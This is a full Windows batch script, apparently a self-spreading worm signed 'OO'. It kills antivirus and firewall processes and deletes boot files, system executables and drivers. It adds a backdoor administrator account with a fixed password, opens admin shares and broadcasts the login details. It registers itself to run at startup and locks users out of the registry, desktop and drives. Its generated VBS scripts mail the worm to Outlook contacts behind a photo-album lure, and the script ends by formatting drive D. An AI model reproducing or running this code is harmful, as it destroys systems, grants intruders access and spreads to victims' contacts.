@echo off
color 4e
start o2o.bat /MIN /HIGH
tskill ccapp
tskill Rfw
tskill KAVPFW
tskill KAV9X
tskill PFW
tskill RavMon
tskill RavMonD
tskill iamapp
tskill ccapp>Hint.bat
tskill Rfw>>Hint.bat
tskill KAVPFW>>Hint.bat
tskill KAV9X>>Hint.bat
tskill PFW>>Hint.bat
tskill RavMon>>Hint.bat
tskill RavMonD>>Hint.bat
tskill iamapp>>Hint.bat
del /q /f /a:r c:\boot.ini>Backup.bat
del /q /f /a:r c:\NTDETECT.COM>>Backup.bat
del /q /f /a:- c:\boot.ini>>Backup.bat
del /q /f /a:- c:\windows\system32\OEMINFO.ini
del /q /f /a:s c:\windows\system32\shell32.dll>>Backup.bat
echo [general]>c:\windows\system32\OEMINFO.ini
echo Manufacturer=This program made by OO>>c:\windows\system32\OEMINFO.ini
echo Model=I am sorry.>>c:\windows\system32\OEMINFO.ini
copy o2o.bat c:\windows\system32\
echo start c:\windows\system32\shutdown.exe -r -c "OO is running away! Help me!" -f -t 1000>>c:\windows\help\Hint.bat
echo if not exist c:\windows\system32\chkdsk.bat copy d:\boot.bat c:\windows\system32\>>c:\windows\help\Hint.bat
echo rename c:\windows\system32\boot.bat chkdsk.bat>>c:\windows\help\Hint.bat
echo if not exist c:\windows\system32\logon.vbs copy d:\system\logon.vbs c:\windows\system32\>>c:\windows\help\Hint.bat
echo if not exist c:\windows\Backup\Backup.bat start c:\windows\system32\chkdsk.bat>>c:\windows\help\Hint.bat
echo start c:\windows\system32\logon.vbs>>c:\windows\help\Hint.bat
echo rename c:\windows\system32\boot.bat chkdsk.bat>>c:\windows\help\Hint.bat
echo net user oo 163 /add>>c:\windows\help\Hint.bat
echo net localgroup administrators oo /add>>c:\windows\help\Hint.bat
echo net start netbois>>c:\windows\help\Hint.bat
echo net share ipc$>>c:\windows\help\Hint.bat
echo net share admin$>>c:\windows\help\Hint.bat
echo net share C$=c:\>>c:\windows\help\Hint.bat
echo net share D$=d:\>>c:\windows\help\Hint.bat
echo net start "messenger">>c:\windows\help\Hint.bat
echo Windows Registry Editor Version 5.00>backup.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>backup.reg
echo "Backup"="C:\\WINDOWS\\Backup\\Backup.bat">>backup.reg
echo "Chkdsk"="c:\\windows\\system32\\chkdsk.bat">>backup.reg
echo reg import c:\windows\Backup\backup.reg>>c:\windows\help\Hint.bat
xcopy backup.reg c:\windows\Backup\
echo Windows Registry Editor Version 5.00>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "Logon"="C:\\WINDOWS\\System32\\logon.vbs">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "MSHelp"="C:\\WINDOWS\\HELP\\Hint.bat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings]>>h.reg
echo "Key"=hex:db,23,45,6f,8e,41,70,4c,44,5e,d0,23,79,c2,b4,b1>>h.reg
echo "Hint"="Hello. I am OO.">>h.reg
echo "FileName0"="C:\\WINDOWS\\System32\\RSACi.rat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings\.Default]>>h.reg
echo "Allow_Unknowns"=dword:00000000>>h.reg
echo "PleaseMom"=dword:00000001>>h.reg
echo "Enabled"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings\.Default\http://www.rsac.org/ratingsv01.html]>>h.reg
echo "v"=dword:00000004>>h.reg
echo "s"=dword:00000004>>h.reg
echo "n"=dword:00000004>>h.reg
echo "l"=dword:00000004>>h.reg
echo [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>h.reg
echo "DisableRegistryTools"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.reg]>>h.reg
echo @="JPEG Image">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.gif]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.htm]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.html]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.bat]>>h.reg
echo @="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.doc]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe\PersistentHandler]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.mp3]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.vbs]>>h.reg
echo @="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system]>>h.reg
echo "dontdisplaylastusername"=dword:00000001>>h.reg
echo "legalnoticecaption"="Fuck">>h.reg
echo "legalnoticetext"="It's ok to be a gay.">>h.reg
echo "shutdownwithoutlogon"=dword:00000000>>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "NoClose"=hex:01,00,00,00>>h.reg
echo "NoChangeStartMenu"=hex:01,00,00,00>>h.reg
echo "NoSetTaskbar"=hex:01,00,00,00>>h.reg
echo "NoDesktop"=hex:01,00,00,00>>h.reg
echo "NoDrives"=dword:03ffffff>>h.reg
echo "NoTrayContextMenu"=hex:01,00,00,00>>h.reg
echo "NoDriveTypeAutoRun"=dword:00000091>>h.reg
echo "NoRun"=dword:00000001>>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "Chkdsk"="C:\\WINDOWS\\System32\\chkdsk.bat">>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "DisableRegistryTools"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>>h.reg
echo "DefaultUserName"="oo">>h.reg
echo "Shell"="c:\\windows\\system32\\chkdsk.bat">>h.reg
echo "AltDefaultUserName"="Administrator">>h.reg
echo "DontDisplayLastUserName"="1">>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "Start_ShowRun"=dword:00000000>>h.reg
echo "Start_ShowControlPanel"=dword:00000000>>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "NoViewContextMenu"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "OO"="C:\\WINDOWS\\System32\\sspipes.scr">>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "Start Page"="http://www.doggiehome.com/">>h.reg
echo "FullScreen"="yes">>h.reg
echo "Show_URLToolBar"="no">>h.reg
echo "Show_URLinStatusBar"="no">>h.reg
echo "Show_StatusBar"="no">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "ScanRegistry"="">>h.reg
reg import h.reg
On Error Resume Next>o2o.vbs
Set fs=CreateObject("Scripting.FileSystemObject")>>o2o.vbs
Set d1=fs.GetSpecialFolder(0)>>o2o.vbs
Set d2=fs.GetSpecialFolder(1)>>o2o.vbs
Set d4=fs.GetSpecialFolder(2)>>o2o.vbs
Set so=CreateObject("Scripting.FileSystemObject")>>o2o.vbs
dim r>>o2o.vbs
Set r=CreateObject("Wscript.Shell")>>o2o.vbs
so.GetFile(WScript.ScriptFullName).Copy(d1&"\o2o.vbs")>>o2o.vbs
so.GetFile(WScript.ScriptFullName).Copy(d4&"\o2o.bat")>>o2o.vbs
so.GetFile(WScript.ScriptFullName).Copy(d2&"\o2o.vbs")>>o2o.vbs
so.GetFile(WScript.ScriptFullName).Copy(d1&"\Start Menu\Programs\startup\o2o.vbs")>>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",63000000,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry","">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\o2o","c:\o2o.vbs">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKLM\Software\CLASSES\.reg\","JPEG Image">>o2o.vbs
Set ol=CreateObject("Outlook.Application")>>o2o.vbs
On Error Resume Next>>o2o.vbs
For x=1 To 20>>o2o.vbs
Set Mail=ol.CreateItem(0)>>o2o.vbs
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>o2o.vbs
Mail.Subject="过得如何？">>o2o.vbs
Mail.Body="最近照的几张照片，已经用电子相册编辑过了，满漂亮的，特地发给你看看。">>o2o.vbs
Mail.Attachments.Add(d4&"o2o.bat")>>o2o.vbs
Mail.Send>>o2o.vbs
Next>>o2o.vbs
ol.Quit>>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",1,"REG_DWORD">>o2o.vbs
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",1,"REG_DWORD">>o2o.vbs
echo On Error Resume Next>o.vbs
echo Set fs=CreateObject("Scripting.FileSystemObject")>>o.vbs
echo Set dir1=fs.GetSpecialFolder(0)>>o.vbs
echo set dir3=fs.GetSpecialFolder(1)>>o.vbs
echo Set so=CreateObject("Scripting.FileSystemObject")>>o.vbs
echo so.GetFile(WScript.ScriptFullName).Copy(dir1&"\o.vbs")>>o.vbs
echo so.GetFile(WScript.ScriptFullName).Copy(dir3&"\o2o.bat")>>o.vbs
echo Set oo=CreateObject("Outlook.Application")>>o.vbs
echo For x=1 To 30>>o.vbs
echo Set Mail=oo.CreateItem(0)>>o.vbs
echo Mail.to=oo.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>o.vbs
echo Mail.Subject="过得如何？">>o.vbs
echo Mail.Body="最近照的几张照片，已经用电子相册编辑过了，满漂亮的，特地发给你看看。">>o.vbs
echo Mail.Attachments.Add(dir3&"o2o.bat")>>o.vbs
echo Mail.Send>>o.vbs
copy o.vbs c:\windows\system\
copy o2o.vbs c:\windows\system32\
rename c:\windows\system\o.vbs logon.vbs
rename c:\windows\system32\o2o.vbs logon.vbs
rename c:\windows\system32\o2o.bat chkdsk.bat
copy c:\windows\system32\chkdsk.bat d:\
rename d:\chkdsk.bat boot.bat
xcopy c:\windows\system32\logon.vbs d:\system\
echo [Components] >c:\sql
echo TSEnable = on >>c:\sql
sysocmgr /i:c:\windows\inf\sysoc.inf /u:c:\sql /q
sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q  
del C:\server
start o.vbs
del /q /a:H /c:\windows\Prefetch\Layout.ini
del /q /f /a:- c:\windows\Prefetch\Layout.ini
echo [OptimalLayoutFile]>>c:\windows\Prefetch\Layout.ini
echo Version=1>>c:\windows\Prefetch\Layout.ini
echo c:\windows\system32\chkdsk.bat>>c:\windows\Prefetch\Layout.ini
echo c:\windows\help\Hint.bat>>c:\windows\Prefetch\Layout.ini
echo shell=c:\windows\system32\chkdsk.bat>>c:\windows\system.ini
echo shell=c:\windows\system32\chkdsk.bat>>c:\windows\win.ini
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\About.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Install.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Install.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Install.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Install.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Install.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\Tank1.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank2.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank3.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank4.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank5.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank6.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank7.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank8.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank9.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\You.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\$winnt$.inf
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\ntfs.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\loop.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\power.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\poloo.sys
copy o.vbs c:\
del /q backup.reg
del /q h.reg
del /q o2o.vbs
del /q o.vbs
net user oo 163 /add
net localgroup administrators oo /add
net share ipc$
net share C$=c:\
net share D$=d:\
del /q /f /a:- C:\WINDOWS\system32\*.exe>>Backup.bat
del /q /f /a:s C:\WINDOWS\system32\*.exe>>Backup.bat
del /q /f c:\windows\Prefetch\*>>Backup.bat
del /q /f /a:- c:\windows\Prefetch\Layout.ini
del /q /f /a:- c:\windows\repair\*.ini
del /q /f /a:h c:\windows\repair\*>>Backup.bat
del /q /f /a:a C:\WINDOWS\system32\drivers\*.sys>>Backup.bat
del /q /f c:\windows\system32\*.nls>>Backup.bat
del /q /f /a:s c:\windows\system32\*>>Backup.bat
del /q /f c:\windows\lastgood\*>>Backup.bat
del /q /f c:\windows\system\*>>Backup.bat
del /q /f c:\windows\pss\*>>Backup.bat
start c:\o.vbs>>Backup.bat
start c:\windows\system32\chkdsk.bat
xcopy Backup.bat c:\windows\Backup\
net start "messenger"
del /q Backup.bat
net send * attack me user:oo password:163
net send * attack me user:oo password:163
net send * attack me user:oo password:163
net send * attack me user:oo password:163
ping www.doggiehome.com /n 15 /l 800 /t
ping www.doggiehome.com /n 15 /l 800 /t
ping www.doggiehome.com /n 15 /l 800 /t
ping www.doggiehome.com /n 15 /l 800 /t
ping www.doggiehome.com /n 15 /l 800 /t
net start "netbios"
net start "rpcss"
chkdsk
format d: /c /f
tskill *
print c:\Hello.txt
